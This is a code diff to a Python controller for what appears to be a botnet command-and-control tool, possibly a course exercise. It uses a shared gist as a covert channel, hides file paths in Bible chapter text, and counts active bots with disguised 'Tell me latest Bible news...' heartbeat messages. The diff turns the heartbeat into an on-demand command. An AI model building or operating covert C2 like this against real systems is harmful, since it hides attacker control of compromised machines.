@@ -1,8 +1,7 @@
 import sys
 import uuid
-from threading import Thread
-from time import sleep
 from datetime import datetime
+from pytimedinput import timedInput
 
 sys.path.append('..')
 from common.utils import add_message, check_chat_file, get_replies_to_msg_id, read_attachment, reset_gist
@@ -20,6 +19,27 @@ def encode_path(pth):
     chapter_text = read_chapter(chapter_for_encoding)
     encoded_pth, used_length = encode_to_text(pth, chapter_text)
     return encoded_pth[0:used_length]
+
+
+def check_heartbeat(minutes):
+    print(f'Starting to check heartbeat for {minutes} minutes...', flush=True)
+    print('Type "stop" to stop it', flush=True)
+    for i in range(minutes):
+        msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
+        now = datetime.now()
+
+        for _ in range(10):
+            x, _ = timedInput('> ', timeout=6)
+            print('\033[A\033[A')
+            if x == 'stop':
+                print(f'Stopping heartbeat...', flush=True)
+                return
+
+        replies = get_replies_to_msg_id(msg_id)
+        bot_names = list(map(lambda x: x[0], replies))
+        bot_names_str = f' ({"".join(bot_names)})' if len(bot_names) > 0 else ''
+        print(f'({i + 1}/{minutes}) Active bots ({now}): {len(bot_names)}{bot_names_str}', flush=True)
+    print(f'Heartbeat finished...', flush=True)
 
 
 def process_cmd(cmd):
@@ -61,19 +81,11 @@ def process_cmd(cmd):
         reset_gist()
         print('Gist reset to initial message', flush=True)
 
+    elif len(cmd_parts) == 2 and cmd_parts[0] == 'heartbeat' and cmd_parts[1].isdigit():
+        check_heartbeat(int(cmd_parts[1]))
+
     else:
         print(f'Unknown command: {cmd}', flush=True)
-
-
-def check_heartbeat():
-    while True:
-        msg_id = add_message('Tell me latest Bible news...', CONTROLLER_NICK_NAME)
-        now = datetime.now()
-        sleep(HEARTBEAT_TIME)
-        replies = get_replies_to_msg_id(msg_id)
-        bot_names = list(map(lambda x: x[0], replies))
-        bot_names_str = f' ({"".join(bot_names)})' if len(bot_names) > 0 else ''
-        print(f'Active bots ({now}): {len(bot_names)}{bot_names_str}')
 
 
 def run():
@@ -81,9 +93,6 @@ def run():
     init_gist()
     check_chat_file()
     print(f'Controller is running as {CONTROLLER_NICK_NAME}...')
-
-    heartbeat_thread = Thread(target=check_heartbeat, daemon=True)
-    heartbeat_thread.start()
 
     while True:
         cmd = input('BSY CC > ')
